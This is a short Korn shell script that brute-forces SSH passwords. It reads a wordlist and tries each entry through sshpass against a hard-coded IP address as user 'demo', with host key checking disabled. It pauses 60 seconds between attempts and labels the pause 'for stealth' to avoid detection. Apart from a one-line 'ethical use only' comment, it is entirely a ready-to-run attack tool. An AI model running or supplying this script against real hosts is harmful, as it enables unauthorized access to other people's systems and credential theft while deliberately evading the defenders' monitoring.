#!/bin/ksh
################################################################
# Simple SSH brute-force script in Korn shell with 60s delay
# Use responsibly. Ethical use only.
################################################################

# Configurable parameters
hostname="194.108.117.16"
port=22
user="demo"
passlist="words"
delay=60  # seconds, for stealth

found=0
correct_password=""

# Function to attempt SSH login
try_ssh() {
    password="$1"
    # Use sshpass for non-interactive login (install sshpass)
    sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -p "$port" "$user@$hostname" 'echo success' >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        correct_password="$password"
        found=1
        exit 0
    else
        echo "Failed: $password"
    fi
}

# Check if sshpass is installed
if ! command -v sshpass >/dev/null 2>&1; then
    echo "sshpass is required but not installed. Install it and rerun."
    exit 1
fi

# Read password list and attempt
while IFS= read -r password; do
    if [ "$found" -eq 1 ]; then
        break
    fi
    try_ssh "$password"
    echo "Waiting for $delay seconds for stealth..."
    sleep "$delay"
done < "$passlist"

if [ "$found" -eq 1 ]; then
    echo "Success! Password: $correct_password"
else
    echo "Password not found in list."
fi